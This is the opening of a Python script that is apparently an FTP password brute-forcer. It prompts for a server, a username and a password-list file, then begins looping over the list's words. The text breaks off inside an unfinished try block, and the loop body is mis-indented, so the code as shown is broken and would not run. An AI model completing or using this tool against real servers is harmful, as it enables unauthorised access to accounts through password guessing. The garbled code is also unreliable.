#! /usr/bin/python3

import ftplib

server = input("FTP Server: ")

user = input("Username: ")

Passwordlist = input("Path to Password List: ")

try:

    with open(Passwordlist, 'r') as pw:
        for word in pw:
        
        word = word.strip('\r\n')

        try:
            